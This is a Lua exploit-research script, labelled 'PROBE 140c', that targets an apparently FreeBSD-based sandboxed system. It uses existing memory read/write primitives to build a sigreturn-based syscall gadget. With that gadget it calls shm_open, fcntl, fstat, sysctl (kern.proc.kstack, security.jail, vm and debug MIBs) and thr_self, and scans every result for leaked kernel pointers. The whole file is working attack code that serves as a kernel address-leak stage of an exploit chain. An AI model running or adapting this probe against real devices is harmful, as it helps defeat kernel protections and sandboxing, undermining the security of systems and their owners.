-- CRASH_CLASS: LOW
-- PROBE 140c: fcntl on shm fds, kern.proc.kstack, security.jail, extended sysctl
--
-- Novel angles: fcntl commands might return kernel-internal info.
-- kern.proc.kstack might dump the kernel stack (KERN_PROC_KSTACK=39).
-- security.jail.list might leak jail structure kernel pointers.
-- Also: try reading the thread status via thr_self and checking
-- if the TID encodes any kernel information.

print("=== PROBE 140c: FCNTL+SHM+KSTACK ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh2, rl2 = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh2, rl2 - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

local mib = gpu + 0x100
local outbuf = gpu + 0x200
local oldlenp = gpu + 0x1F0
local path_buf = gpu + 0x300

--------------------------------------------------------------------
-- A: shm_open + fcntl deep scan
-- fcntl commands: F_GETFL=3, F_GETFD=1, F_GETOWN=5
-- F_GETLK=11, F_READAHEAD=15, F_RDAHEAD=16
-- Plus non-standard: F_ADD_SEALS=19, F_GET_SEALS=20
--------------------------------------------------------------------
print("")
print("--- [A] shm + fcntl ---")
ws(path_buf, "/test_leak")
local shm_fd = srop(482, ua(path_buf), uint64(0x0202), uint64(0x1FF))
local sh, sl = get_hi_lo(shm_fd)
print("[A] shm_open fd=" .. hex(shm_fd))
if sl > 0 and sl < 256 and sh == 0 then
    -- Set size
    srop(480, uint64(sl), uint64(0x4000))

    -- Try all fcntl commands
    for cmd = 0, 20 do
        local rv = srop(92, uint64(sl), uint64(cmd), uint64(0))
        local rvh, rvl = get_hi_lo(rv)
        -- F_GETLK needs a flock structure
        if cmd == 11 then
            local flock_buf = gpu + 0x400
            zero(flock_buf, 0x40)
            rv = srop(92, uint64(sl), uint64(cmd), ua(flock_buf))
            rvh, rvl = get_hi_lo(rv)
            if rvl == 0 and rvh == 0 then
                print(string.format("[A] fcntl(F_GETLK)=OK"))
                for off = 0, 0x28, 8 do
                    local v = safe_rq(flock_buf + off)
                    if v then
                        local vh, vl = get_hi_lo(v)
                        if vh > 0 or vl > 0 then
                            print(string.format("[A]   flock+0x%02X: %s", off, hex(v)))
                        end
                        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                            kfound = kfound + 1
                            print("[A] *** KERNEL POINTER! ***")
                        end
                    end
                end
            end
        else
            if rvl ~= 0xFFFFFFFF or rvh ~= 0xFFFFFFFF then
                print(string.format("[A] fcntl(cmd=%d)=%s", cmd, hex(rv)))
            end
        end
    end

    -- fstat on shm fd — deep scan all fields
    local stat_buf = gpu + 0x500
    zero(stat_buf, 0x100)
    srop(189, uint64(sl), ua(stat_buf))
    print("[A] shm fstat:")
    for off = 0, 0x80, 8 do
        local v = safe_rq(stat_buf + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh > 0 or vl > 0 then
                print(string.format("[A]   stat+0x%02X: %s", off, hex(v)))
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print("[A] *** KERNEL POINTER! ***")
                end
            end
        end
    end

    -- mmap the shm, then use sys 674 to check the mapping details
    local shm_va = srop(477, uint64(0), uint64(0x4000), uint64(3),
        uint64(0x0001), uint64(sl), uint64(0))
    print("[A] shm mmap=" .. hex(shm_va))

    srop(6, uint64(sl))
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: kern.proc.kstack = {1, 14, 39, pid}
-- FreeBSD 9+ — dumps kernel thread stack traces
--------------------------------------------------------------------
print("")
print("--- [B] kern.proc.kstack ---")
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 14)
memory.write_dword(mib + 8, 39) -- KERN_PROC_KSTACK
memory.write_dword(mib + 12, pid)
zero(outbuf, 0x4000)
memory.write_dword(oldlenp, 0x4000)
memory.write_dword(oldlenp + 4, 0)
local rv_ks = srop(202, ua(mib), uint64(4), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
local ksh, ksl = get_hi_lo(rv_ks)
local ks_len = to_num(memory.read_dword(oldlenp))
print("[B] kstack ret=" .. hex(rv_ks) .. " len=" .. ks_len)
if ksl == 0 and ksh == 0 and ks_len > 0 then
    print("[B] *** KSTACK DATA! ***")
    -- Print as text
    local s = ""
    for i = 0, math.min(ks_len, 500) - 1 do
        local b = to_num(memory.read_byte(outbuf + i))
        if b >= 32 and b < 127 then s = s .. string.char(b)
        elseif b == 10 then s = s .. "\n"
        else s = s .. "." end
    end
    print("[B] " .. s)
    -- Scan for kernel pointers
    for off = 0, math.min(ks_len, 0x4000) - 1, 8 do
        local v = safe_rq(outbuf + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print(string.format("[B] *** KPTR kstack+0x%X: %s ***", off, hex(v)))
            end
        end
    end
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: security.jail sysctl = {3, xxx}
-- MIB: security=3
-- Try: security.jail.list, security.jail.param
--------------------------------------------------------------------
print("")
print("--- [C] security sysctl ---")
-- Try various security MIBs
local sec_mibs = {
    {name="sec.jail.jailed", m={3, 6, 1}},
    {name="sec.jail.param", m={3, 6, 100}},
    {name="sec.jail.list", m={3, 6, 2}},
    {name="sec.prison_racct", m={3, 6, 3}},
    {name="sec.bsd.see_other_uids", m={3, 1, 1}},
    {name="sec.bsd.see_other_gids", m={3, 1, 2}},
    {name="sec.bsd.unprivileged_proc_debug", m={3, 1, 4}},
}
for _, s in ipairs(sec_mibs) do
    for i = 1, #s.m do
        memory.write_dword(mib + (i-1)*4, s.m[i])
    end
    zero(outbuf, 0x1000)
    memory.write_dword(oldlenp, 0x1000)
    memory.write_dword(oldlenp + 4, 0)
    local rv = srop(202, ua(mib), uint64(#s.m), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
    local rvh, rvl = get_hi_lo(rv)
    local got = to_num(memory.read_dword(oldlenp))
    if rvl == 0 and rvh == 0 and got > 0 then
        local val = safe_rq(outbuf)
        print(string.format("[C] *** %s WORKS! len=%d val=%s ***", s.name, got,
            val and hex(val) or "nil"))
        -- Scan for kernel pointers
        for off = 0, math.min(got, 0x100) - 1, 8 do
            local v = safe_rq(outbuf + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print(string.format("[C] *** KPTR %s+0x%X: %s ***",
                        s.name, off, hex(v)))
                end
            end
        end
    else
        print(string.format("[C] %s: ret=%s", s.name, hex(rv)))
    end
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- D: Extended sysctl exploration
-- kern.features, kern.conftxt, kern.file, vm.uma.*, etc.
--------------------------------------------------------------------
print("")
print("--- [D] Extended sysctl ---")
local ext_mibs = {
    {name="kern.features", m={1, 38}},
    {name="kern.conftxt", m={1, 39}},
    {name="kern.file", m={1, 15}},
    {name="kern.maxfilesperproc", m={1, 27}},
    {name="kern.maxprocperuid", m={1, 28}},
    {name="kern.ipc.maxsockbuf", m={1, 30, 1}},
    {name="kern.ipc.somaxconn", m={1, 30, 3}},
    {name="vm.pmap.kernel_start", m={2, 1}},
    {name="vm.kvm_size", m={2, 7}},
    {name="vm.kvm_free", m={2, 8}},
    {name="vm.v_page_size", m={2, 10}},
    {name="vm.v_page_count", m={2, 11}},
    {name="vm.v_free_count", m={2, 12}},
    {name="vm.phys_avail", m={2, 20}},
    {name="vm.swap_total", m={2, 30}},
    {name="machdep.tsc_freq", m={7, 1}},
    {name="debug.kdb.available", m={5, 1}},
    {name="debug.kdb.current", m={5, 2}},
}
for _, s in ipairs(ext_mibs) do
    for i = 1, #s.m do
        memory.write_dword(mib + (i-1)*4, s.m[i])
    end
    zero(outbuf, 0x1000)
    memory.write_dword(oldlenp, 0x1000)
    memory.write_dword(oldlenp + 4, 0)
    local rv = srop(202, ua(mib), uint64(#s.m), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
    local rvh, rvl = get_hi_lo(rv)
    local got = to_num(memory.read_dword(oldlenp))
    if rvl == 0 and rvh == 0 and got > 0 then
        local val = safe_rq(outbuf)
        local vh, vl = 0, 0
        if val then vh, vl = get_hi_lo(val) end
        local kptr_mark = ""
        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
            kfound = kfound + 1
            kptr_mark = " *** KPTR! ***"
        end
        -- Is it a string?
        local is_str = true
        for i = 0, math.min(got, 8) - 1 do
            local b = to_num(memory.read_byte(outbuf + i))
            if b > 0 and (b < 32 or b > 126) then is_str = false; break end
        end
        if is_str and got > 4 then
            local str = ""
            for i = 0, math.min(got, 100) - 1 do
                local b = to_num(memory.read_byte(outbuf + i))
                if b == 0 then break end
                if b >= 32 and b < 127 then str = str .. string.char(b) end
            end
            print(string.format("[D] *** %s: len=%d str='%s'%s ***",
                s.name, got, str, kptr_mark))
        else
            print(string.format("[D] *** %s: len=%d val=%s%s ***",
                s.name, got, val and hex(val) or "nil", kptr_mark))
        end
        -- Scan all values for kernel pointers
        for off = 0, math.min(got, 0x100) - 1, 8 do
            local v = safe_rq(outbuf + off)
            if v then
                local vvh, vvl = get_hi_lo(v)
                if vvh >= 0xFFFF8000 and vvh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print(string.format("[D] *** KPTR %s+0x%X: %s ***",
                        s.name, off, hex(v)))
                end
            end
        end
    end
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- E: TID analysis — check if thread IDs encode kernel info
--------------------------------------------------------------------
print("")
print("--- [E] TID analysis ---")
-- thr_self(432) returns current TID
local tid_buf = gpu + 0x800
memory.write_dword(tid_buf, 0)
memory.write_dword(tid_buf + 4, 0)
local rv_ts = srop(432, ua(tid_buf))
print("[E] thr_self=" .. hex(rv_ts))
local tid = safe_rq(tid_buf)
print("[E] TID=" .. (tid and hex(tid) or "nil"))
-- Check if TID high bits are meaningful
if tid then
    local th, tl = get_hi_lo(tid)
    if th >= 0xFFFF8000 and th ~= 0xFFFFFFFF then
        kfound = kfound + 1
        print("[E] *** TID IS KERNEL POINTER! ***")
    end
end
print("[E] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
